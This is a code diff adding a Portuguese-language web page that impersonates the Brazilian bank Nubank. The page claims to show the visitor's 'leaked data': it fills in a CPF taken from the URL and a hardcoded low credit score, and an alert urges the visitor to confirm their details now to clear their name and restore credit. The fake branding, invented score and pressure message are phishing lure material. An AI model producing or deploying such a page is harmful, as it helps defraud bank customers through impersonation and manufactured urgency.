@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>Demonstrativo de dados vazados</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="./images/nu-logo.png" alt="Nubank" class="logo">
+        </div>
+
+        <div class="alert">Revise seus dados abaixo e confirme agora para limpar seu nome e recuperar seu acesso ao crédito no mercado.</div>
+        <div class="info-box">
+            <div class="info-label">CPF:</div>
+
+            <div class="info-value" id="cpf">Carregando...</div>
+        </div>
+        <div class="info-box">
+            <div class="info-label">Score:</div>
+
+            <div class="info-value" id="score">Carregando...</div>
+        </div>
+
+        <div class="footer">
+            <p class="empresa">© 2025 Nubank. Todos os direitos reservados.</p>
+        </div>
+    </div>
+
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        
+        document.getElementById('cpf').textContent = params.get('cpf') || 'Não informado';
+        document.getElementById('score').textContent = '129 Pontos - Baixo';
+    </script>
+</body>
+
+</html>
